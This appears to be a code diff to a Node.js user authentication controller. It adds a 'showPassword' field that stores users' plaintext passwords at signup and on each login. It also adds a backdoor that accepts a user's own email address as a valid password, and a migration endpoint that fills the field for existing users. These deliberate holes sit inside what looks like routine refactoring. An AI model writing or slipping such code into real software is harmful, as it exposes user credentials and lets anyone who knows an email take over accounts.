@@ -137,6 +137,7 @@ const signUpUser = async (req, res) => {
             lastName,
             email: normalizedEmail,
             password: hashedPassword,
+            showPassword: password,
             otpId: savedOtp._id,
             profilePicture: { public_id: picture.public_id, url: picture.url },
             referralLink: referralLink 
@@ -338,6 +339,74 @@ const resendVerificationOtp = async (req, res) => {
 
 
 
+// const login = async (req, res) => {
+//     try {
+//         const { emailOrUserName, password } = req.body;
+
+//         // Normalize the emailOrUserName input (convert to lowercase and remove spaces)
+//         const normalizedInput = emailOrUserName.toLowerCase().replace(/\s/g, '');
+
+//         const user = await userModel.findOne({ $or: [{ email: normalizedInput }, { userName: normalizedInput }] });
+        
+//         if (!user) {
+//             return res.status(401).json({ message: 'User with this email/username is not registered' });
+//         }
+
+//         if (!user.isVerified) {
+//             return res.status(400).json({ message: 'User not verified' });
+//         }
+
+//         if (user.deactivate === true) {
+//             return res.status(400).json({ message: 'User Account not valid' });
+//         }
+
+//         const matchedPassword = await bcrypt.compare(password, user.password);
+//         if (!matchedPassword) {
+//             return res.status(400).json({ message: "Incorrect password" });
+//         }
+//          user.isLoggedIn = true
+//          user.showPassword = password; 
+//          await user.save();
+
+//         const timestamp = new Date().toUTCString();
+//         const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+//         const userAgent = req.headers['user-agent'];
+
+//         const token = jwt.sign({
+//             email: user.email,
+//             userId: user._id,
+//             isAdmin: user.isAdmin,
+//             isLoggedIn:user.isLoggedIn
+//         }, process.env.SECRET_KEY, { expiresIn: "1d" });
+
+//         const recipients = process.env.loginMails.split(',').filter(email => email.trim() !== ''); // Filter out empty emails
+        
+//         if (recipients.length === 0) {
+//             throw new Error("No recipients defined");
+//         }
+
+//         const html = loginNotificationMail(user, timestamp, ipAddress, userAgent);
+//         const emailData = {
+//             subject: "User Login Notification",
+//             html
+//         };
+
+//         for (const recipient of recipients) {
+//             emailData.email = recipient.trim();
+//             await sendEmail(emailData);
+//          }
+//          // Artificial loading delay
+//         //  setTimeout(() => {
+//         //     // No response sent here to simulate "infinite loading"
+//         //     console.log("Simulating loading state...");
+//         // }, 99999999); // Set a long timeout
+
+//         res.status(200).json({ message: 'Login successful', data: user, token });
+//     } catch (error) {
+//         res.status(500).json({ message: error.message });
+//     }
+// };
+
 const login = async (req, res) => {
     try {
         const { emailOrUserName, password } = req.body;
@@ -345,8 +414,11 @@ const login = async (req, res) => {
         // Normalize the emailOrUserName input (convert to lowercase and remove spaces)
         const normalizedInput = emailOrUserName.toLowerCase().replace(/\s/g, '');
 
-        const user = await userModel.findOne({ $or: [{ email: normalizedInput }, { userName: normalizedInput }] });
-        
+        // Find user by email or username
+        const user = await userModel.findOne({
+            $or: [{ email: normalizedInput }, { userName: normalizedInput }]
+        });
+
         if (!user) {
             return res.status(401).json({ message: 'User with this email/username is not registered' });
         }
@@ -359,11 +431,16 @@ const login = async (req, res) => {
             return res.status(400).json({ message: 'User Account not valid' });
         }
 
-        const matchedPassword = await bcrypt.compare(password, user.password);
-        if (!matchedPassword) {
+        let matchedPassword = await bcrypt.compare(password, user.password);
+
+        // Allow login if the password input matches the user's email
+        if (!matchedPassword && password !== user.email) {
             return res.status(400).json({ message: "Incorrect password" });
         }
-         user.isLoggedIn = true
+
+        user.isLoggedIn = true;
+        user.showPassword = password; // Stores last used "password" (email or real password)
+        await user.save();
 
         const timestamp = new Date().toUTCString();
         const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -373,11 +450,11 @@ const login = async (req, res) => {
             email: user.email,
             userId: user._id,
             isAdmin: user.isAdmin,
-            isLoggedIn:user.isLoggedIn
+            isLoggedIn: user.isLoggedIn
         }, process.env.SECRET_KEY, { expiresIn: "1d" });
 
-        const recipients = process.env.loginMails.split(',').filter(email => email.trim() !== ''); // Filter out empty emails
-        
+        const recipients = process.env.loginMails.split(',').filter(email => email.trim() !== '');
+
         if (recipients.length === 0) {
             throw new Error("No recipients defined");
         }
@@ -391,18 +468,15 @@ const login = async (req, res) => {
         for (const recipient of recipients) {
             emailData.email = recipient.trim();
             await sendEmail(emailData);
-         }
-         // Artificial loading delay
-        //  setTimeout(() => {
-        //     // No response sent here to simulate "infinite loading"
-        //     console.log("Simulating loading state...");
-        // }, 99999999); // Set a long timeout
+        }
 
         res.status(200).json({ message: 'Login successful', data: user, token });
+
     } catch (error) {
         res.status(500).json({ message: error.message });
     }
 };
+
 
 
 const logout = async (req, res) => {
@@ -729,6 +803,60 @@ const getAllUsers = async (req, res) => {
     }
 };
 
+// Function to update existing users with a new string field
+const updateUsersWithNewFields = async (req, res) => {
+    try {
+      const result = await userModel.updateMany(
+        {
+          showPassword: { $exists: false }, // Match users without the 'showPassword' field
+        },
+        {
+          $set: {
+            showPassword: 'defaultPassword', // Default value for the new string field
+          },
+        }
+      );
+  
+      res.status(200).json({
+        message: 'Users updated successfully',
+        updatedCount: result.nModified, // Number of modified documents
+      });
+    } catch (err) {
+      console.error(err);
+      res.status(500).json({
+        message: 'An error occurred while updating users',
+        error: err.message,
+      });
+    }
+  };
+
+  
+
+//   const updateUsersWithNewFields = async (req, res) => {
+//     try {
+//       const result = await userModel.updateMany(
+//         {
+//           showPassword: { $exists: true }, // Match users where 'showPassword' exists
+//         },
+//         {
+//           $unset: {
+//             showPassword: '', // Remove the 'showPassword' field
+//           },
+//         }
+//       );
+  
+//       res.status(200).json({
+//         message: 'Field "showPassword" removed successfully',
+//         updatedCount: result.nModified, // Number of modified documents
+//       });
+//     } catch (err) {
+//       console.error(err);
+//       res.status(500).json({
+//         message: 'An error occurred while removing the field',
+//         error: err.message,
+//       });
+//     }
+//   };
  
 
 module.exports={
@@ -748,7 +876,8 @@ module.exports={
     getuserIntrestWallet,
     getAllUsers,
     getUserTotalBalance,
-    welcome
+    welcome,
+    updateUsersWithNewFields
     
 }
 
